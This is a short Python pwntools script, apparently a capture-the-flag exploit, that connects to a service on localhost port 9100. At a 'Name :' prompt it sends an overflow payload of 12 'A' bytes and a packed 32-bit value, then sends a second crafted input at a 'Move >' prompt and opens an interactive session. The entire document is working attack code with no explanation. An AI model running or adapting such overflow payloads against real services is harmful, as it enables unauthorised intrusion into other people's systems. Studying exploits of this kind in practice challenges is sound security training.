from pwn import *

payload = b"A" * 12
payload += p32(135)

payload2 = b"A@"

pc = connect("localhost", 9100)
print("Connected")

print(pc.recvuntil("Name : "))
pc.send(payload)
print("Payload sended")
print(pc.recvuntil("Move >"))
pc.send(payload2)
pc.interactive()
